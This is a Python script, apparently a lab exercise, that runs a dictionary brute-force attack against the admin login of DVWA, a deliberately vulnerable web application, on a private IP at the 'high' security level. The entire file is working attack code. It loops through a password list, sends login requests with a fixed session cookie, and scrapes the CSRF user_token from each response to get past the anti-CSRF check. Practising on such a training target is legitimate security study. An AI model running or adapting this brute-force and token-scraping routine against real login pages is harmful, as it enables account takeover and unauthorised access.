import requests

def webAttack():
   print(">>>>> DVWA Brute Force Login Attack <<<<<")
   dic = 'dic_passwd.txt'
   url = 'http://192.168.56.103/dvwa/vulnerabilities/brute/'
   flag = False

   security = "high"
   PHPSESSID = "5bfa88dac2a9896a0e80d9dac37cbceb"

   with open(dic, 'r') as f:
      for passwd in f.readlines():
         passwd = passwd.strip()

         # PHPSESSID 알맞게 수정
         cookie = {"security":security, "PHPSESSID":PHPSESSID}
         data = {
            "username" : "admin",
            "password" : passwd,
            "Login" : "Login"
         }


         r = requests.get(url, params=data, cookies=cookie)
         # print(r.text)

         if r.text.find("CSRF token is incorrect") > -1:
            tmp = r.text.split("'user_token'")
            user_token = (tmp[1].split("'"))[1]
            data["user_token"] = user_token
            print("[!] Try", data["username"], data["password"], data["user_token"])
            r = requests.get(url, params=data, cookies=cookie)

         if r.text.find("Welcome") > -1:
            print("[+] Find password :", passwd)
            flag = True
            break
         else:
            print("[-] Not password :", passwd)
            pass

   if not flag:
      print("[!] CAN NOT MATCH PASSWORDS in", dic)

   print(">>>>> Finish Attack <<<<<")


def main():
   print("Start Program!\n")
   webAttack()

if __name__ == '__main__':
   main()